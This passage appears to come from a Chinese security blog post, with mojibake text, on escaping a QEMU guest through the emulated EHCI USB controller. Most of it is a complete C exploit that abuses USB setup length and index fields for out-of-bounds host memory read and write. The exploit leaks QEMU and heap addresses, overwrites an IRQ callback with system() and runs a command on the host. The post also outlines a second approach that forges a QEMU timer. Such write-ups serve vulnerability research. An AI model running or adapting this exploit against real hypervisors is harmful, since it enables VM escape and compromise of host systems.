class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> *mmio;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">uint8_t</span> *setup_buf;<br><span class="hljs-type">size_t</span> *payload_buf;<br><span class="hljs-type">void</span> *data_buf;<br><span class="hljs-type">void</span> *data_buf_oob;<br><span class="hljs-type">uint32_t</span> *entry;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> * <span class="hljs-title">qh</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> * <span class="hljs-title">qtd</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PRESET       (1 &lt;&lt; 8)     <span class="hljs-comment">// Port Reset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PED          (1 &lt;&lt; 2)     <span class="hljs-comment">// Port Enable/Disable</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_RUNSTOP      (1 &lt;&lt; 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_PSE          (1 &lt;&lt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_OUT         0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_IN          0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_ACTIVE    (1 &lt;&lt; 7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_SETUP     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_IN        1 <span class="hljs-comment">/* device -&gt; host */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_OUT       0 <span class="hljs-comment">/* host -&gt; device */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SETUP_STATE_DATA    2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_TBYTES_SH 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_PID_SH    8</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br><br>    <span class="hljs-comment">/* endpoint characteristics */</span><br>    <span class="hljs-type">uint32_t</span> epchar;<br><br>    <span class="hljs-comment">/* endpoint capabilities */</span><br>    <span class="hljs-type">uint32_t</span> epcap;<br><br>    <span class="hljs-type">uint32_t</span> current_qtd;             <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> next_qtd;                <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext_qtd;<br><br>    <span class="hljs-type">uint32_t</span> token;                   <span class="hljs-comment">/* Same as QTD token */</span><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqh;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext;                 <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> token;<br><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqtd;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span>&#123;<br>    *(<span class="hljs-type">uint32_t</span> *)(mmio + addr) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint32_t</span> *)(mmio + addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_length</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> len, <span class="hljs-type">uint8_t</span> option)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(setup_buf);<br><br>    setup_buf[<span class="hljs-number">0</span>] = option;<br>    <span class="hljs-comment">// setup_buf[2] = value &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[3] = (value &gt;&gt; 8 ) &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[4] = index &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[5] = (index &gt;&gt; 8 ) &amp; 0xff;</span><br>    setup_buf[<span class="hljs-number">6</span>] = len &amp; <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = (len &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_from_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_to_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_IN;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    read_from_usb();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">void</span> *payload, <span class="hljs-type">uint32_t</span> payload_size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + payload_size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload, payload_size);<br>    <span class="hljs-comment">//getchar();</span><br>    write_to_usb();<br>&#125;<br><br><span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x3000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    mlock(buf, <span class="hljs-number">0x3000</span>);<br><br>    entry = buf + <span class="hljs-number">4</span>;<br>    qh = buf + <span class="hljs-number">0x100</span>;<br>    qtd = buf + <span class="hljs-number">0x200</span>;<br>    setup_buf = buf + <span class="hljs-number">0x300</span>;<br>    payload_buf = buf + <span class="hljs-number">0x400</span>;<br>    data_buf = buf + <span class="hljs-number">0x1000</span>;<br>    data_buf_oob = buf + <span class="hljs-number">0x2000</span>;<br><br>    *entry = gva_to_gpa(qh) + <span class="hljs-number">2</span>;<br><br>    <span class="hljs-comment">// set_length(0x100, USB_DIR_IN);</span><br>    arb_read(<span class="hljs-number">0x2004</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">size_t</span> elf_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-type">size_t</span> elf_base_addr = elf_addr - <span class="hljs-number">0x538467</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base_addr + <span class="hljs-number">0x2c4940</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_base_addr_is %#lx\n&quot;</span>, elf_base_addr);<br><br>    <span class="hljs-type">size_t</span> heap_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf);<br>    <span class="hljs-type">size_t</span> usb_device_addr = heap_addr - <span class="hljs-number">0x2050</span>;<br>    <span class="hljs-type">size_t</span> ehci_state_addr = usb_device_addr - <span class="hljs-number">0x83260</span>;<br>    <span class="hljs-type">size_t</span> usb_data_buf = usb_device_addr + <span class="hljs-number">0xdc</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_usb_device_addr_is %#lx\n&quot;</span>, usb_device_addr);<br><br>    <span class="hljs-type">size_t</span> irq_addr = usb_device_addr - <span class="hljs-number">0x7c0</span>;<br>    <br>    *payload_buf = system_plt;<br>    *(payload_buf + <span class="hljs-number">1</span>) = usb_data_buf;<br>    arb_write((<span class="hljs-type">uint32_t</span>)(irq_addr + <span class="hljs-number">0x28</span> - usb_data_buf), payload_buf, <span class="hljs-number">0x10</span>);<br><br>    set_length(<span class="hljs-number">0x40</span>, USB_DIR_OUT);<br>    <span class="hljs-built_in">memcpy</span>(data_buf, cmd, <span class="hljs-number">0x40</span>);<br>    write_to_usb();<br><br>    mmio_write(<span class="hljs-number">0x24</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                                            </p><h4 id="ä¿®æ”¹time-list"><a href="#ä¿®æ”¹time-list" class="headerlink" title="ä¿®æ”¹time_list"></a>ä¿®æ”¹time_list</h4><p>å¦ä¸€ç§å°±æ˜¯å‚è€ƒCVE-2019-6778çš„åšæ³•ï¼Œä¸ä¾èµ–ä»»ä½•è®¾å¤‡çš„å‡½æ•°ï¼Œç›´æ¥ä¼ªé€ QEMUTimerListå’ŒQEMUTimerï¼Œä¿®æ”¹qemuçš„å…¨å±€å˜é‡main_loop_tlgçš„å€¼ä¸ºä¼ªé€ çš„QEMUTimerListçš„åœ°å€ï¼Œç­‰å¾…QEMUTimerä¸­çš„cb(opaque)å»è‡ªåŠ¨æ‰§è¡Œã€‚</p><p>ä¸è¿‡çœŸçš„æœ‰å¿…è¦å»ä¼ªé€ ä¸€ä¸ªQEMUTimerListå—ï¼Ÿåœ¨<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/util/qemu-timer.c#L557">timerlist_run_timers</a>å‡½æ•°ä¸­ï¼Œts &#x3D; timer_list-&gt;active_timersï¼Œæœ€åå†å»è°ƒç”¨tsè¿™ä¸ªQEMUTimerä¸­çš„cb(opaque)ï¼Œé‚£ä¹ˆç›´æ¥ä¿®æ”¹timer_list-&gt;active_timersä¸ºä¸€ä¸ªä¼ªé€ çš„QEMUTimeråœ°å€ä¾ç„¶å¯ä»¥è¾¾åˆ°ç›®çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((ts = timer_list-&gt;active_timers)) &#123;<br>      <span class="hljs-keyword">if</span> (!timer_expired_ns(ts, current_time)) &#123;<br>          <span class="hljs-comment">/* No expired timers left.  The checkpoint can be skipped</span><br><span class="hljs-comment">           * if no timers fired or they were all external.</span><br><span class="hljs-comment">           */</span><br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (need_replay_checkpoint<br>              &amp;&amp; !(ts-&gt;attributes &amp; QEMU_TIMER_ATTR_EXTERNAL)) &#123;<br>          <span class="hljs-comment">/* once we got here, checkpoint clock only once */</span><br>          need_replay_checkpoint = <span class="hljs-literal">false</span>;<br>          qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>          <span class="hljs-keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL)) &#123;<br>              <span class="hljs-keyword">goto</span> out;<br>          &#125;<br>          qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br>          <span class="hljs-comment">/* The lock was released; start over again in case the list was</span><br><span class="hljs-comment">           * modified.</span><br><span class="hljs-comment">           */</span><br>          <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>      <span class="hljs-comment">/* remove timer from the list before calling the callback */</span><br>      timer_list-&gt;active_timers = ts-&gt;next;<br>      ts-&gt;next = <span class="hljs-literal">NULL</span>;<br>      ts-&gt;expire_time = <span class="hljs-number">-1</span>;<br>      cb = ts-&gt;cb;<br>      opaque = ts-&gt;opaque;<br><br>      <span class="hljs-comment">/* run the callback (the timer list can be modified) */</span><br>      qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>      cb(opaque);<br>      qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br><br>      progress = <span class="hljs-literal">true</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>â€‹                                              </p><p>å®Œæ•´expï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span 